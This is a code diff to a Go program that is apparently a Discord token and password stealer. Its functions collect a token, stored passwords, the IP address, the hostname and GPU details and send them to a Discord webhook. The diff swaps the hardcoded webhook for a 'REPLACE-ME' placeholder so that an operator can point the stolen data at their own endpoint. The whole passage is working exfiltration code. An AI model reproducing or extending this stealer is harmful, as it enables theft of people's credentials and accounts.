@@ -42,7 +42,7 @@ var mIp string
 var mHostname string
 var osName string
 var mToken = ""
-
+var uWebhook = "REPLACE-ME"
 func Discord() {
 	GetToken()
 	SendWebHook()
@@ -130,7 +130,7 @@ func SendPasswords() {
 	part.Write(content)
 	writer.Close()
 
-	req, err := http.NewRequest("POST", webhook, reqBody)
+	req, err := http.NewRequest("POST", uWebhook, reqBody)
 	if err != nil {
 		return
 	}
@@ -205,7 +205,7 @@ func SendWebHook() {
 
 	payload, err := json.Marshal(hook)
 	if err != nil {}
-	discordwebhook.ExecuteWebhook(webhook, payload)
+	discordwebhook.ExecuteWebhook(uWebhook, payload)
 }
 func getGPU() string {
 	Info := exec.Command("cmd", "/C", "wmic path win32_VideoController get name")
